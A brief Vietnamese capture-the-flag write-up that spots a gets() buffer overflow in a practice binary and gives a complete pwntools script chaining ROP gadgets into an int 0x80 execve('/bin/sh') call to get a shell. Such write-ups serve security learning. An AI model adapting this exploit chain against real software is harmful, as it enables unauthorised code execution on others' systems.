# khai thác
ta thấy lỗi BOF ở đây
```c
  puts("How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!");
  return gets(v1);
```

ta sẽ tìm offset và dùng ropgadget để thực thi execve("/bin/sh, 0, 0)
ta dùng ropgadget tìm các push_eax, pop_eax, pop_ecx, và thực thi int_80
```python
from pwn import *
context.binary = exe = ELF("./vuln", checksec=False)
r = process('./vuln')
input()
push_eax = 0x08070fed
pop_eax = 0x080b074a
pop_ecx = 0x08049e39
int_80 = 0x0804a3d2

payload = b'/bin/sh\x00'
payload = payload.ljust(28)
payload+= p32(push_eax)
payload+=flat(pop_eax, 0xb)
payload+=flat(pop_ecx, 0)
payload+=p32(int_80)
r.sendlineafter(b"grasshopper!\n", payload)

r.interactive()
```
bài này em coi wu kcsc =)))